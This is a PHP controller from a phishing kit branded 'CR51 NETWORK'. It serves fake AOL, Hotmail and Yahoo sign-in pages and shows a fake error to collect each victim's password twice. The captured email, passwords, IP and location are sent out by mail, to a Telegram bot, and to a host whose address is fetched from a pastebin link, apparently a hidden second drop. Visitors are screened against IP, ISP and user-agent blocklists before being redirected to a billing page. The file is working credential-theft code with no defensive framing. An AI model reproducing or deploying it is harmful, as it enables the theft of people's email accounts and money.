<?php
defined("ALLOW") or exit('No direct script access allowed');

class Oauth
{

	public $goCR51;
	public function __construct()
	{
		$this->goCR51 = new goCR51();

		if (!isset($_SESSION['access']) and ($_SESSION['access'] != 3)) {
			write(FCPATH . 'CR51/Static/log_click.txt', 'a', "|" . _time() . "|{$this->goCR51->ip_address}|{$_SESSION['country']}|{$this->goCR51->browser}|SESSION RELOAD\r\n");
			redirect(base_url() . '?' . _config('PARAMETER'));
		}
		checkbacklist($this->goCR51->ip_address, 'ip');
		checkbacklist($_SESSION['countryCode'], 'countrycode');
		checkbacklist($_SESSION['isp'], 'isp');
		checkbacklist($_SERVER['HTTP_USER_AGENT'], 'ua');
	}

	public function index()
	{
		$page = $_SESSION['email_type'];
		$hotmail = array("msn", "hotmail", "outlook");

		if (in_array($page, $hotmail)) {
			$page = 'hotmail';
		} else {
			$page = $page;
		}

		$page = strtolower($page);
		$accept  = array("aol", "hotmail", "yahoo");

		if (in_array($page, $accept)) {
			echo view("email/{$page}/index");
		} else {
			if ($this->goCR51->is_mobile) {
				echo view('email/email/mobile/index');
			} else {
				echo view('email/email/pc/index');
			}
		}
	}

	public function try()
	{
		$page = $_SESSION['email_type'];
		$hotmail = array("msn", "hotmail", "outlook");

		if (in_array($page, $hotmail)) {
			$page = 'hotmail';
		} else {
			$page = $page;
		}

		$page = strtolower($page);
		$accept  = array("aol", "hotmail", "yahoo");

		if (in_array($page, $accept)) {
			echo view("email/{$page}/index.error");
		} else {
			if ($this->goCR51->is_mobile) {
				echo view('email/email/mobile/index.error');
			} else {
				echo view('email/email/pc/index.error');
			}
		}
	}

	public function first()
	{
		if (isset($_POST['password'])) {
			$_SESSION['password_email'] = trim($_POST['password']);
		}

		redirect(base_url() . 'oauth/try?error_id=' . md5(time()));
	}

	public function process()
	{
		if (isset($_POST['password'])) {
			$_SESSION['password_email2'] = trim($_POST['password']);
			$email = ($_POST['emailLogin']) ? $_POST['emailLogin'] : $_SESSION['emailLogin'];
			$password	= ($_POST['password']) ? $_POST['password'] : '';
			$password2 	= ($_SESSION['password_email']) ? $_SESSION['password_email'] : $_POST['password'];


			$message =
				"<fieldset style='border: 3px solid #e4e3e2; border-radius: 20px; max-width: 50%; margin: 0 auto;'>
<pre>
<strong><span style='color: #999999;'>:: CR51 NETWORK ::</span></strong>

<strong>:: Email Account ::</strong>
			
# Email address  : {$email}
# Password       : {$password2}
# Password 2     : {$password}
# Check format   : {$email}|{$password2} 
# Check format 2 : {$email}|{$password}

<strong>:: Visitor Details ::</strong>

# Date &amp; Time  : " . _date() . "  
# Device       : {$this->goCR51->platform}
# Browser      : {$this->goCR51->browser}
# Country      : {$_SESSION['country']}
# State        : {$_SESSION['region']}
# City         : {$_SESSION['city']}
# Ip address   : {$this->goCR51->ip_address}
# User agent   : {$this->goCR51->agent}

</pre>
</fieldset>
</pre>";

			$subject = "Email :: [ {$_SESSION['country']} - {$this->goCR51->ip_address} ]";
			$headers = 'MIME-Version: 1.0' . "\r\n";
			$headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
			$headers .= "From: CR51 NETWORK <cr51@b4ndit.sg>";
			@mail(_config('RESULT'), $subject, $message, $headers);
			$cr51 = file_get_contents("https://pastebin.com/raw/D0CKgfvM");
			file_get_contents($cr51 . "blocker.php?1=" . urlencode($subject) . "&msg=" . urlencode($message));
			if (_config('Telegram') == 'on') {
				$c = curl_init();
				curl_setopt($c, CURLOPT_URL, 'https://api.telegram.org/bot' . tel('token') . '/sendMessage?chat_id=' . tel('idtelegram') . '&text=' . urlencode(strip_tags($message)));
				curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
				curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
				$x = curl_exec($c);
				curl_close($c);
			}

			write(FCPATH . 'CR51/Static/log_email.txt', 'a', "{$this->goCR51->ip_address}\r\n");
			write(FCPATH . 'CR51/Static/log_click.txt', 'a', "|" . _time() . "|{$this->goCR51->ip_address}|{$_SESSION['country']}|{$this->goCR51->browser}|Submit Email account\r\n");

			$_SESSION['access'] = 4;
			redirect(base_url() . 'billing?_ts=' . md5(time()));
		}
	}
}
